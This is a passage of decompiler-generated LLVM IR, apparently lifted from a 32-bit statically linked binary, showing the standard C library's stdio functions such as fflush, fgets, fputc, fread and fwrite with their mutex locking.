  %v4_805bee4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805bed5)
  %v0_805bee9 = load i32, i32* @ebx, align 4
  %v1_805beec = call i32 @pthread_mutex_lock(i32 %v0_805bee9)
  %v0_805bef4.pre = load i32, i32* @esi, align 4
  %v1_805bef4 = inttoptr i32 %v0_805bef4.pre to i32*
  %v2_805bef4 = load i32, i32* %v1_805bef4, align 4
  store i32 %v2_805bef4, i32* @ebx, align 4
  %v3_805bf03 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_805bf0b

dec_label_pc_805bf0b:                             ; preds = %dec_label_pc_805bef4.thread, %dec_label_pc_805befa
  %v0_805bf0b.in = phi i32* [ @ebx, %dec_label_pc_805befa ], [ %arg1, %dec_label_pc_805bef4.thread ]
  %v0_805bf0b = load i32, i32* %v0_805bf0b.in, align 4
  %v1_805bf10 = and i32 %v0_805bf0b, 8
  store i32 %v0_805bec6, i32* @ebx, align 4
  store i32 %v0_805bec5, i32* @esi, align 4
  store i32 %v0_805bec4, i32* @edi, align 4
  ret i32 %v1_805bf10

; uselistorder directives
  uselistorder i32 %tmp5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805bf0b, { 1, 0 }
}

define i32 @fflush(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805bf18 = load i32, i32* @edi, align 4
  %v0_805bf19 = load i32, i32* @esi, align 4
  %v0_805bf1a = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805bf22 = icmp eq i32 %arg1, 0
  br i1 %v1_805bf22, label %dec_label_pc_805bf76, label %dec_label_pc_805bf26

dec_label_pc_805bf26:                             ; preds = %entry
  %v9_805bf26 = icmp eq i32 %arg1, 134692220
  br i1 %v9_805bf26, label %dec_label_pc_805bf76, label %dec_label_pc_805bf2e

dec_label_pc_805bf2e:                             ; preds = %dec_label_pc_805bf26
  %v1_805bf2e = add i32 %arg1, 52
  %v2_805bf2e = inttoptr i32 %v1_805bf2e to i32*
  %v3_805bf2e = load i32, i32* %v2_805bf2e, align 4
  store i32 %v3_805bf2e, i32* @edi, align 4
  %v1_805bf31 = icmp eq i32 %v3_805bf2e, 0
  %v1_805bf33 = icmp eq i1 %v1_805bf31, false
  br i1 %v1_805bf33, label %dec_label_pc_805bf2e.dec_label_pc_805bf54_crit_edge, label %dec_label_pc_805bf35

dec_label_pc_805bf2e.dec_label_pc_805bf54_crit_edge: ; preds = %dec_label_pc_805bf2e
  br label %dec_label_pc_805bf54

dec_label_pc_805bf35:                             ; preds = %dec_label_pc_805bf2e
  %v1_805bf35 = add i32 %arg1, 56
  store i32 %v1_805bf35, i32* @ebx, align 4
  %v4_805bf44 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805bf35)
  %v0_805bf49 = load i32, i32* @ebx, align 4
  %v1_805bf4c = call i32 @pthread_mutex_lock(i32 %v0_805bf49)
  br label %dec_label_pc_805bf54

dec_label_pc_805bf54:                             ; preds = %dec_label_pc_805bf2e.dec_label_pc_805bf54_crit_edge, %dec_label_pc_805bf35
  %v1_805bf58 = inttoptr i32 %arg1 to i16*
  %v2_805bf58 = call i32 @fflush_unlocked(i16* %v1_805bf58)
  store i32 %v2_805bf58, i32* @ebx, align 4
  br i1 %v1_805bf33, label %dec_label_pc_805bf84, label %dec_label_pc_805bf66

dec_label_pc_805bf66:                             ; preds = %dec_label_pc_805bf54
  %v3_805bf6f = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805bf87.pre.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bf81

dec_label_pc_805bf76:                             ; preds = %dec_label_pc_805bf26, %entry
  %v1_805bf7a = inttoptr i32 %arg1 to i16*
  %v2_805bf7a = call i32 @fflush_unlocked(i16* %v1_805bf7a)
  br label %dec_label_pc_805bf81

dec_label_pc_805bf81:                             ; preds = %dec_label_pc_805bf66, %dec_label_pc_805bf76
  %v0_805bf87.pre = phi i32 [ %v0_805bf87.pre.pre, %dec_label_pc_805bf66 ], [ %v2_805bf7a, %dec_label_pc_805bf76 ]
  br label %dec_label_pc_805bf84

dec_label_pc_805bf84:                             ; preds = %dec_label_pc_805bf54, %dec_label_pc_805bf81
  %v0_805bf87 = phi i32 [ %v2_805bf58, %dec_label_pc_805bf54 ], [ %v0_805bf87.pre, %dec_label_pc_805bf81 ]
  store i32 %v0_805bf1a, i32* @ebx, align 4
  store i32 %v0_805bf19, i32* @esi, align 4
  store i32 %v0_805bf18, i32* @edi, align 4
  ret i32 %v0_805bf87

; uselistorder directives
  uselistorder i32 %arg1, { 4, 1, 3, 2, 0, 6, 5 }
  uselistorder label %dec_label_pc_805bf84, { 1, 0 }
  uselistorder label %dec_label_pc_805bf81, { 1, 0 }
  uselistorder label %dec_label_pc_805bf54, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805bf90 = load i32, i32* @edi, align 4
  %v0_805bf91 = load i32, i32* @esi, align 4
  %v0_805bf92 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805bf9a = add i32 %arg3, 52
  %v2_805bf9a = inttoptr i32 %v1_805bf9a to i32*
  %v3_805bf9a = load i32, i32* %v2_805bf9a, align 4
  store i32 %v3_805bf9a, i32* @edi, align 4
  %v1_805bf9d = icmp eq i32 %v3_805bf9a, 0
  %v1_805bf9f = icmp eq i1 %v1_805bf9d, false
  br i1 %v1_805bf9f, label %entry.dec_label_pc_805bfc0_crit_edge, label %dec_label_pc_805bfa1

entry.dec_label_pc_805bfc0_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805bfc0

dec_label_pc_805bfa1:                             ; preds = %entry
  %v1_805bfa1 = add i32 %arg3, 56
  store i32 %v1_805bfa1, i32* @ebx, align 4
  %v4_805bfb0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805bfa1)
  %v0_805bfb5 = load i32, i32* @ebx, align 4
  %v1_805bfb8 = call i32 @pthread_mutex_lock(i32 %v0_805bfb5)
  %v0_805bfc1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bfc0

dec_label_pc_805bfc0:                             ; preds = %entry.dec_label_pc_805bfc0_crit_edge, %dec_label_pc_805bfa1
  %v0_805bfc1 = phi i32 [ %arg3, %entry.dec_label_pc_805bfc0_crit_edge ], [ %v0_805bfc1.pre, %dec_label_pc_805bfa1 ]
  %v0_805bfc0 = load i32, i32* @edx, align 4
  %v4_805bfca = inttoptr i32 %arg1 to i8*
  %v5_805bfca = call i32 @__GI_fgets_unlocked(i8* %v4_805bfca, i32 %arg2, i32 %v0_805bfc1, i32 %v0_805bfc0)
  store i32 %v5_805bfca, i32* @ebx, align 4
  br i1 %v1_805bf9f, label %dec_label_pc_805bfe9, label %dec_label_pc_805bfd8

dec_label_pc_805bfd8:                             ; preds = %dec_label_pc_805bfc0
  %v3_805bfe1 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805bfec.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bfe9

dec_label_pc_805bfe9:                             ; preds = %dec_label_pc_805bfc0, %dec_label_pc_805bfd8
  %v0_805bfec = phi i32 [ %v5_805bfca, %dec_label_pc_805bfc0 ], [ %v0_805bfec.pre, %dec_label_pc_805bfd8 ]
  store i32 %v0_805bf92, i32* @ebx, align 4
  store i32 %v0_805bf91, i32* @esi, align 4
  store i32 %v0_805bf90, i32* @edi, align 4
  ret i32 %v0_805bfec

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805bfe9, { 1, 0 }
  uselistorder label %dec_label_pc_805bfc0, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805bff4 = load i32, i32* @edi, align 4
  %v0_805bff5 = load i32, i32* @esi, align 4
  %v0_805bff6 = load i32, i32* @ebx, align 4
  %v12_805bff7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v4_805bffe = sext i8 %arg1 to i32
  store i32 %v4_805bffe, i32* @edi, align 4
  %v1_805c002 = add i32 %arg2, 52
  %v2_805c002 = inttoptr i32 %v1_805c002 to i32*
  %v3_805c002 = load i32, i32* %v2_805c002, align 4
  %v4_805c002 = icmp eq i32 %v3_805c002, 0
  br i1 %v4_805c002, label %dec_label_pc_805c02a, label %dec_label_pc_805c008

dec_label_pc_805c008:                             ; preds = %entry
  %v1_805c008 = add i32 %arg2, 16
  %v2_805c008 = inttoptr i32 %v1_805c008 to i32*
  %v3_805c008 = load i32, i32* %v2_805c008, align 4
  store i32 %v3_805c008, i32* %eax.global-to-local, align 4
  %v2_805c00b = add i32 %arg2, 28
  %v3_805c00b = inttoptr i32 %v2_805c00b to i32*
  %v4_805c00b = load i32, i32* %v3_805c00b, align 4
  %v10_805c00b = icmp ult i32 %v3_805c008, %v4_805c00b
  %v1_805c00e = icmp eq i1 %v10_805c00b, false
  br i1 %v1_805c00e, label %dec_label_pc_805c01d, label %dec_label_pc_805c010

dec_label_pc_805c010:                             ; preds = %dec_label_pc_805c008
  store i32 %v4_805bffe, i32* @edx, align 4
  %v3_805c012 = inttoptr i32 %v3_805c008 to i8*
  store i8 %arg1, i8* %v3_805c012, align 1
  %v0_805c014 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c014 = add i32 %v0_805c014, 1
  store i32 %v1_805c014, i32* %eax.global-to-local, align 4
  %v0_805c015 = load i32, i32* @edx, align 4
  %v1_805c015 = urem i32 %v0_805c015, 256
  store i32 %v1_805c015, i32* @ebx, align 4
  %v1_805c018 = load i32, i32* @esi, align 4
  %v2_805c018 = add i32 %v1_805c018, 16
  %v3_805c018 = inttoptr i32 %v2_805c018 to i32*
  store i32 %v1_805c014, i32* %v3_805c018, align 4
  br label %dec_label_pc_805c07d

dec_label_pc_805c01d:                             ; preds = %dec_label_pc_805c008
  %v4_805c021 = call i32 @putc_unlocked(i8 %arg1, i32 %arg2)
  store i32 %v4_805c021, i32* %eax.global-to-local, align 4
  store i32 %v4_805c021, i32* @ebx, align 4
  br label %dec_label_pc_805c07a

dec_label_pc_805c02a:                             ; preds = %entry
  %v1_805c02a = add i32 %arg2, 56
  store i32 %v1_805c02a, i32* @ebx, align 4
  store i32 %v12_805bff7, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v12_805bff7, 16777216
  %v1_805c039 = sdiv i32 %sext, 16777216
  %v4_805c039 = inttoptr i32 %v1_805c039 to i32*
  %v5_805c039 = call i32 @__pthread_cleanup_push_defer(i32* %v4_805c039, i32 134583465, i32 %v1_805c02a)
  store i32 %v5_805c039, i32* %eax.global-to-local, align 4
  %v0_805c03e = load i32, i32* @ebx, align 4
  %sext3 = mul i32 %v0_805c03e, 16777216
  %v1_805c041 = sdiv i32 %sext3, 16777216
  %v2_805c041 = call i32 @pthread_mutex_lock(i32 %v1_805c041)
  store i32 %v2_805c041, i32* %eax.global-to-local, align 4
  %v0_805c046 = load i32, i32* @esi, align 4
  %v1_805c046 = add i32 %v0_805c046, 16
  %v2_805c046 = inttoptr i32 %v1_805c046 to i32*
  %v3_805c046 = load i32, i32* %v2_805c046, align 4
  store i32 %v3_805c046, i32* %eax.global-to-local, align 4
  %v2_805c04c = add i32 %v0_805c046, 28
  %v3_805c04c = inttoptr i32 %v2_805c04c to i32*
  %v4_805c04c = load i32, i32* %v3_805c04c, align 4
  %v10_805c04c = icmp ult i32 %v3_805c046, %v4_805c04c
  %v1_805c04f = icmp eq i1 %v10_805c04c, false
  %v0_805c061 = load i32, i32* @edi, align 4
  br i1 %v1_805c04f, label %dec_label_pc_805c05e, label %dec_label_pc_805c051

dec_label_pc_805c051:                             ; preds = %dec_label_pc_805c02a
  store i32 %v0_805c061, i32* %edx.global-to-local, align 4
  %v1_805c053 = trunc i32 %v0_805c061 to i8
  %v3_805c053 = inttoptr i32 %v3_805c046 to i8*
  store i8 %v1_805c053, i8* %v3_805c053, align 1
  %v0_805c055 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c055 = add i32 %v0_805c055, 1
  store i32 %v1_805c055, i32* %eax.global-to-local, align 4
  %v0_805c056 = load i32, i32* %edx.global-to-local, align 4
  %v1_805c056 = urem i32 %v0_805c056, 256
  store i32 %v1_805c056, i32* @ebx, align 4
  %v1_805c059 = load i32, i32* @esi, align 4
  %v2_805c059 = add i32 %v1_805c059, 16
  %v3_805c059 = inttoptr i32 %v2_805c059 to i32*
  store i32 %v1_805c055, i32* %v3_805c059, align 4
  br label %dec_label_pc_805c06c

dec_label_pc_805c05e:                             ; preds = %dec_label_pc_805c02a
  %v5_805c061 = trunc i32 %v0_805c061 to i8
  %v4_805c062 = call i32 @putc_unlocked(i8 %v5_805c061, i32 %v0_805c046)
  store i32 %v4_805c062, i32* %eax.global-to-local, align 4
  store i32 %v4_805c062, i32* @ebx, align 4
  br label %dec_label_pc_805c06c

dec_label_pc_805c06c:                             ; preds = %dec_label_pc_805c051, %dec_label_pc_805c05e
  store i32 %v12_805bff7, i32* %eax.global-to-local, align 4
  %v4_805c075 = call i32 @__pthread_cleanup_pop_restore(i32* %v4_805c039, i32 1)
  store i32 %v4_805c075, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c07a

dec_label_pc_805c07a:                             ; preds = %dec_label_pc_805c01d, %dec_label_pc_805c06c
  br label %dec_label_pc_805c07d

dec_label_pc_805c07d:                             ; preds = %dec_label_pc_805c010, %dec_label_pc_805c07a
  %v0_805c080 = load i32, i32* @ebx, align 4
  store i32 %v0_805c080, i32* %eax.global-to-local, align 4
  store i32 %v0_805bff6, i32* @ebx, align 4
  store i32 %v0_805bff5, i32* @esi, align 4
  store i32 %v0_805bff4, i32* @edi, align 4
  ret i32 %v0_805c080

; uselistorder directives
  uselistorder i32 %v0_805c061, { 2, 1, 0 }
  uselistorder i32 %v12_805bff7, { 1, 0, 2 }
  uselistorder i32 (i8, i32)* @putc_unlocked, { 7, 8, 6, 0, 1, 2, 3, 4, 5, 9, 10 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_805c07d, { 1, 0 }
  uselistorder label %dec_label_pc_805c07a, { 1, 0 }
  uselistorder label %dec_label_pc_805c06c, { 1, 0 }
}

define i32 @fread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805c088 = load i32, i32* @edi, align 4
  %v0_805c089 = load i32, i32* @esi, align 4
  %v0_805c08a = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @esi, align 4
  %v1_805c092 = add i32 %arg4, 52
  %v2_805c092 = inttoptr i32 %v1_805c092 to i32*
  %v3_805c092 = load i32, i32* %v2_805c092, align 4
  store i32 %v3_805c092, i32* @edi, align 4
  %v1_805c095 = icmp eq i32 %v3_805c092, 0
  %v1_805c097 = icmp eq i1 %v1_805c095, false
  br i1 %v1_805c097, label %entry.dec_label_pc_805c0b8_crit_edge, label %dec_label_pc_805c099

entry.dec_label_pc_805c0b8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805c0b8

dec_label_pc_805c099:                             ; preds = %entry
  %v1_805c099 = add i32 %arg4, 56
  store i32 %v1_805c099, i32* @ebx, align 4
  %v4_805c0a8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805c099)
  %v0_805c0ad = load i32, i32* @ebx, align 4
  %v1_805c0b0 = call i32 @pthread_mutex_lock(i32 %v0_805c0ad)
  %v0_805c0b8.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c0b8

dec_label_pc_805c0b8:                             ; preds = %entry.dec_label_pc_805c0b8_crit_edge, %dec_label_pc_805c099
  %v0_805c0b8 = phi i32 [ %arg4, %entry.dec_label_pc_805c0b8_crit_edge ], [ %v0_805c0b8.pre, %dec_label_pc_805c099 ]
  %v4_805c0c5 = inttoptr i32 %arg1 to i8*
  %v5_805c0c5 = call i32 @__GI_fread_unlocked(i8* %v4_805c0c5, i32 %arg2, i32 %arg3, i32 %v0_805c0b8)
  store i32 %v5_805c0c5, i32* @ebx, align 4
  br i1 %v1_805c097, label %dec_label_pc_805c0e4, label %dec_label_pc_805c0d3

dec_label_pc_805c0d3:                             ; preds = %dec_label_pc_805c0b8
  %v3_805c0dc = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805c0e7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c0e4

dec_label_pc_805c0e4:                             ; preds = %dec_label_pc_805c0b8, %dec_label_pc_805c0d3
  %v0_805c0e7 = phi i32 [ %v5_805c0c5, %dec_label_pc_805c0b8 ], [ %v0_805c0e7.pre, %dec_label_pc_805c0d3 ]
  store i32 %v0_805c08a, i32* @ebx, align 4
  store i32 %v0_805c089, i32* @esi, align 4
  store i32 %v0_805c088, i32* @edi, align 4
  ret i32 %v0_805c0e7

; uselistorder directives
  uselistorder i32 %arg4, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805c0e4, { 1, 0 }
  uselistorder label %dec_label_pc_805c0b8, { 1, 0 }
}

define i32 @fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805c0f0 = load i32, i32* @edi, align 4
  %v0_805c0f1 = load i32, i32* @esi, align 4
  %v0_805c0f2 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @esi, align 4
  %v1_805c0fa = add i32 %arg4, 52
  %v2_805c0fa = inttoptr i32 %v1_805c0fa to i32*
  %v3_805c0fa = load i32, i32* %v2_805c0fa, align 4
  store i32 %v3_805c0fa, i32* @edi, align 4
  %v1_805c0fd = icmp eq i32 %v3_805c0fa, 0
  %v1_805c0ff = icmp eq i1 %v1_805c0fd, false
  br i1 %v1_805c0ff, label %entry.dec_label_pc_805c120_crit_edge, label %dec_label_pc_805c101

entry.dec_label_pc_805c120_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805c120

dec_label_pc_805c101:                             ; preds = %entry
  %v1_805c101 = add i32 %arg4, 56
  store i32 %v1_805c101, i32* @ebx, align 4
  %v4_805c110 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805c101)
  %v0_805c115 = load i32, i32* @ebx, align 4
  %v1_805c118 = call i32 @pthread_mutex_lock(i32 %v0_805c115)
  %v0_805c120.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c120

dec_label_pc_805c120:                             ; preds = %entry.dec_label_pc_805c120_crit_edge, %dec_label_pc_805c101
  %v0_805c120 = phi i32 [ %arg4, %entry.dec_label_pc_805c120_crit_edge ], [ %v0_805c120.pre, %dec_label_pc_805c101 ]
  %v4_805c12d = sext i32 %arg2 to i64
  %v5_805c12d = call i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %v4_805c12d, i32 %arg3, i32 %v0_805c120)
  store i32 %v5_805c12d, i32* @ebx, align 4
  br i1 %v1_805c0ff, label %dec_label_pc_805c14c, label %dec_label_pc_805c13b

dec_label_pc_805c13b:                             ; preds = %dec_label_pc_805c120
  %v3_805c144 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805c14f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c14c

dec_label_pc_805c14c:                             ; preds = %dec_label_pc_805c120, %dec_label_pc_805c13b
  %v0_805c14f = phi i32 [ %v5_805c12d, %dec_label_pc_805c120 ], [ %v0_805c14f.pre, %dec_label_pc_805c13b ]
  store i32 %v0_805c0f2, i32* @ebx, align 4
  store i32 %v0_805c0f1, i32* @esi, align 4
  store i32 %v0_805c0f0, i32* @edi, align 4
  ret i32 %v0_805c14f

; uselistorder directives
  uselistorder i32 %arg4, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805c14c, { 1, 0 }
  uselistorder label %dec_label_pc_805c120, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v6_805c16c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134583465, i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  %v2_805c178 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  %v0_805c17d = load i32, i32* @global_var_807a688.719, align 8
  %v8_805c185 = icmp eq i32 %v0_805c17d, 1
  %v1_805c186 = icmp eq i1 %v8_805c185, false
  br i1 %v1_805c186, label %dec_label_pc_805c21d, label %dec_label_pc_805c18c

dec_label_pc_805c18c:                             ; preds = %entry
  %v0_805c18c = load i32, i32* @global_var_807a68c.720, align 4
  %tmp30 = icmp slt i32 %v0_805c18c, 1
  br i1 %tmp30, label %dec_label_pc_805c21d, label %dec_label_pc_805c199

dec_label_pc_805c199:                             ; preds = %dec_label_pc_805c18c
  store i32 0, i32* @esi, align 4
  %v6_805c1ab = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134583465, i32 ptrtoint (i32* @global_var_8073d80.729 to i32))
  %v2_805c1b7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d80.729 to i32))
  %v0_805c1bc = load i32, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  store i32 %v0_805c1bc, i32* %edx.global-to-local, align 4
  %v1_805c1fe5 = icmp eq i32 %v0_805c1bc, 0
  %v1_805c20012 = icmp eq i1 %v1_805c1fe5, false
  br i1 %v1_805c20012, label %dec_label_pc_805c1c7, label %dec_label_pc_805c202

dec_label_pc_805c1c7:                             ; preds = %dec_label_pc_805c199, %dec_label_pc_805c1fc
  %v0_805c1d7 = phi i32 [ %v0_805c1fc, %dec_label_pc_805c1fc ], [ %v0_805c1bc, %dec_label_pc_805c199 ]
  %v1_805c1c715 = inttoptr i32 %v0_805c1d7 to i16*
  %v2_805c1c7 = load i16, i16* %v1_805c1c715, align 2
  %v1_805c1cf = add i32 %v0_805c1d7, 32
  %v2_805c1cf = inttoptr i32 %v1_805c1cf to i32*
  %v3_805c1cf = load i32, i32* %v2_805c1cf, align 4
  store i32 %v3_805c1cf, i32* @ebx, align 4
  %v1_805c1ca = and i16 %v2_805c1c7, -32720
  %v6_805c1d2 = icmp eq i16 %v1_805c1ca, 48
  br i1 %v6_805c1d2, label %dec_label_pc_805c1db, label %dec_label_pc_805c1d7

dec_label_pc_805c1d7:                             ; preds = %dec_label_pc_805c1c7
  store i32 %v0_805c1d7, i32* @esi, align 4
  br label %dec_label_pc_805c1fc

dec_label_pc_805c1db:                             ; preds = %dec_label_pc_805c1c7
  %v0_805c1db = load i32, i32* @esi, align 4
  %v1_805c1db = icmp eq i32 %v0_805c1db, 0
  %v1_805c1dd = icmp eq i1 %v1_805c1db, false
  br i1 %v1_805c1dd, label %dec_label_pc_805c1e7, label %dec_label_pc_805c1df

dec_label_pc_805c1df:                             ; preds = %dec_label_pc_805c1db
  store i32 %v3_805c1cf, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  br label %dec_label_pc_805c1ea

dec_label_pc_805c1e7:                             ; preds = %dec_label_pc_805c1db
  %v2_805c1e7 = add i32 %v0_805c1db, 32
  %v3_805c1e7 = inttoptr i32 %v2_805c1e7 to i32*
  store i32 %v3_805c1cf, i32* %v3_805c1e7, align 4
  %v0_805c1ea.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c1ea

dec_label_pc_805c1ea:                             ; preds = %dec_label_pc_805c1df, %dec_label_pc_805c1e7
  %v0_805c1f3 = phi i32 [ %v0_805c1d7, %dec_label_pc_805c1df ], [ %v0_805c1ea.pre, %dec_label_pc_805c1e7 ]
  %v1_805c1ea = add i32 %v0_805c1f3, 1
  %v2_805c1ea = inttoptr i32 %v1_805c1ea to i8*
  %v3_805c1ea = load i8, i8* %v2_805c1ea, align 1
  %v4_805c1ea = and i8 %v3_805c1ea, 32
  %v5_805c1ea = icmp eq i8 %v4_805c1ea, 0
  br i1 %v5_805c1ea, label %dec_label_pc_805c1fc, label %dec_label_pc_805c1f0

dec_label_pc_805c1f0:                             ; preds = %dec_label_pc_805c1ea
  %v2_805c1f4 = call i32 @free(i32 %v0_805c1f3)
  br label %dec_label_pc_805c1fc

dec_label_pc_805c1fc:                             ; preds = %dec_label_pc_805c1ea, %dec_label_pc_805c1d7, %dec_label_pc_805c1f0
  %v0_805c1fc = load i32, i32* @ebx, align 4
  store i32 %v0_805c1fc, i32* %edx.global-to-local, align 4
  %v1_805c1fe = icmp eq i32 %v0_805c1fc, 0
  %v1_805c200 = icmp eq i1 %v1_805c1fe, false
  br i1 %v1_805c200, label %dec_label_pc_805c1c7, label %dec_label_pc_805c202

dec_label_pc_805c202:                             ; preds = %dec_label_pc_805c1fc, %dec_label_pc_805c199
  %v4_805c20b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 0, i32* @global_var_807a68c.720, align 4
  %v0_805c21d.pre = load i32, i32* @global_var_807a688.719, align 8
  br label %dec_label_pc_805c21d

dec_label_pc_805c21d:                             ; preds = %dec_label_pc_805c18c, %entry, %dec_label_pc_805c202
  %v0_805c21d = phi i32 [ %v0_805c17d, %dec_label_pc_805c18c ], [ %v0_805c17d, %entry ], [ %v0_805c21d.pre, %dec_label_pc_805c202 ]
  %v1_805c222 = add i32 %v0_805c21d, -1
  store i32 %v1_805c222, i32* @global_var_807a688.719, align 8
  %v4_805c231 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %v4_805c231

; uselistorder directives
  uselistorder i32 %v0_805c1fc, { 1, 2, 0 }
  uselistorder i32 %v0_805c1d7, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805c17d, { 1, 2, 0 }
  uselistorder i16 48, { 0, 2, 1 }
  uselistorder i32* bitcast (i32** @global_var_8073d7c.702 to i32*), { 3, 4, 0, 1, 5, 6, 2, 7 }
  uselistorder label %dec_label_pc_805c21d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c1fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c1ea, { 1, 0 }
  uselistorder label %dec_label_pc_805c1c7, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_805c23c = load i32, i32* @ebp, align 4
  %v0_805c23d = load i32, i32* @edi, align 4
  %v0_805c23e = load i32, i32* @esi, align 4
  %v0_805c23f = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v4_805c245 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805c245, i32* @ebx, align 4
  %v10_805c249 = icmp eq i16* %arg1, inttoptr (i32 134692220 to i16*)
  br i1 %v10_805c249, label %dec_label_pc_805c25e, label %dec_label_pc_805c251

dec_label_pc_805c251:                             ; preds = %entry
  store i32 256, i32* @ebp, align 4
  %v2_805c256 = icmp eq i16* %arg1, null
  %v1_805c258 = icmp eq i1 %v2_805c256, false
  br i1 %v1_805c258, label %dec_label_pc_805c34d, label %dec_label_pc_805c25e

dec_label_pc_805c25e:                             ; preds = %dec_label_pc_805c251, %entry
  store i32 0, i32* @edi, align 4
  %v2_805c26b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805c26b, i32* @ebx, align 4
  %v5_805c270 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  %v2_805c27c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d98.718 to i32))
  store i32 ptrtoint (i32* @global_var_8073d98.718 to i32), i32* @ecx, align 4
  %v0_805c282 = load i32, i32* @global_var_807a688.719, align 8
  %v1_805c288 = add i32 %v0_805c282, 1
  store i32 %v1_805c288, i32* @global_var_807a688.719, align 8
  %v4_805c291 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v5_805c2a4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073d80.729 to i32))
  %v2_805c2b0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073d80.729 to i32))
  %v4_805c2c0 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805c3423 = load i32, i32* @esi, align 4
  %v1_805c3424 = icmp eq i32 %v0_805c3423, 0
  %v1_805c34411 = icmp eq i1 %v1_805c3424, false
  br i1 %v1_805c34411, label %dec_label_pc_805c2ca, label %dec_label_pc_805c346

dec_label_pc_805c2ca:                             ; preds = %dec_label_pc_805c25e, %dec_label_pc_805c33f
  %v0_805c2d8 = phi i32 [ %v3_805c33f, %dec_label_pc_805c33f ], [ %v0_805c3423, %dec_label_pc_805c25e ]
  %v1_805c2ca = inttoptr i32 %v0_805c2d8 to i8*
  %v2_805c2ca = load i8, i8* %v1_805c2ca, align 1
